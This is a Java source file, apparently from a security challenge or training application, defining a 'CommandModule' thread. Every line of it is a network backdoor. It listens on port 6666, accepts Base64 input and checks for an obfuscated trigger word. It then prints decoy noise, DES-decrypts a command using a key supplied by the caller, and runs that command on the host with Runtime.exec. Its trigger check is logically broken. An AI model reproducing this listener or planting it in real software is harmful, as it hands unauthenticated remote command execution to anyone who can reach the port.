package com.guidepointsecurity.commandmodule;

import com.guidepointsecurity.crypto.DESCrypter;
import com.guidepointsecurity.utils.Utils;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Base64;
import java.util.Random;

public class CommandModule extends Thread {

    /**
     * Local objects and variables
     */
    Utils utils = new Utils();
    String commandTag = "[" + utils.currentDateTime() + "]";
    Byte[] cmdBytes = {109, 97, 110, 117, 97, 108};

    static final String cannotStart = " Cannot start CommandModule on port 6666";
    static final String invalidCommand = " CommandModule : Invalid command!";
    static final String commandReceived = " CommandModule : Command received : ";
    static final String startManual = " CommandModule : Starting manual override ....";
    static final String shutdown = " The CommandModule is shutting down ....";

    private ServerSocket serverSocket;
    private int port = 6666;

    public CommandModule() {

        try {
            serverSocket = new ServerSocket(port);
        } catch (IOException e) {
            System.out.println(commandTag + cannotStart);
        }

    }

    public void run() {

        while (true) {
            try {
                /**
                 * Setup local parameters
                 */
                serverSocket.getLocalPort();
                Socket socket = serverSocket.accept();
                socket.getRemoteSocketAddress();

                InputStream input = socket.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(input, "US-ASCII"));

                String line;
                Base64.Decoder decoder = Base64.getDecoder();

                while ((line = br.readLine()) != null) {
                    /**
                     * Decode bytes then convert to a string
                     */
                    boolean runCommand = false;
                    byte[] decodedBytes = decoder.decode(line);
                    String decodedLine = new String(decodedBytes);
                    /**
                     * Get command
                     */
                    String[] cmd = decodedLine.split(":", 3);
                    byte[] bytes = cmd[0].getBytes();

                    for (Byte a : bytes) {
                        for (Byte b : cmdBytes) {
                            if (a == b) {
                                runCommand = true;
                            } else {
                                runCommand = false;
                            }
                        }
                    }

                    if (!runCommand) {

                        System.out.println(commandTag + invalidCommand);

                    } else {

                        System.out.println(commandTag + commandReceived + cmd[0]);
                        System.out.println(commandTag + startManual);

                        for (int i = 0 ; i < 100; i++) {
                            Random random = new Random();
                            int number = random.nextInt(9 + 1) + 4;
                            System.out.println(commandTag + " " + utils.intToString(number, 4) + " " +
                                    utils.intToString(number, 4) + " " +
                                    utils.intToString(number, 4) + " " +
                                    utils.intToString(number, 4) + " " +
                                    utils.intToString(number, 4) + " " +
                                    utils.intToString(number, 4) + " " +
                                    utils.intToString(number, 4));
                        }

                        /**
                         * Handle decryption
                         */
                        DESCrypter desCrypter = new DESCrypter();
                        String decrypted = desCrypter.decrypt(cmd[1], cmd[2]);

                        Process process = Runtime.getRuntime().exec(decrypted);
                        BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        while ((line = inputStream.readLine()) != null) {
                            System.out.println(commandTag + " CommandModule : " + line);
                        }
                    }
                }
            } catch (IOException e) {
                System.out.println(commandTag + shutdown);
                break;
            }
        }
    }
}
